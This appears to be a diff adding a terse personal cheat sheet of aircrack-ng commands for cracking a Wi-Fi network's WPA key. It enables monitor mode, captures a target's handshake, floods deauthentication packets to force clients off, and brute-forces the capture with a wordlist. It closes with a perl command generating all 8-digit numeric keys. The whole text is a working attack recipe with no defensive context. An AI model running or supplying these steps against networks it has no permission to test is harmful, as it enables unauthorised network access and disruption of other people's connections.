@@ -1,0 +1,12 @@
+airmon-ng
+airmon-ng start <wlan0>
+kill <ID>
+rfkill unblock all
+airodump-ng mon0
+airodump-ng -c1 -w <file> --bssid <BSSID> mon0
+aireplay-ng -0 0 -a <BSSID> mon0
+aircrack-ng -w <wordlist> <file>
+
+(Generate 8-digit numeric keys using wordlist generator)
+
+perl wg.pl -l8 -u8 -v 0123456789 > mylist
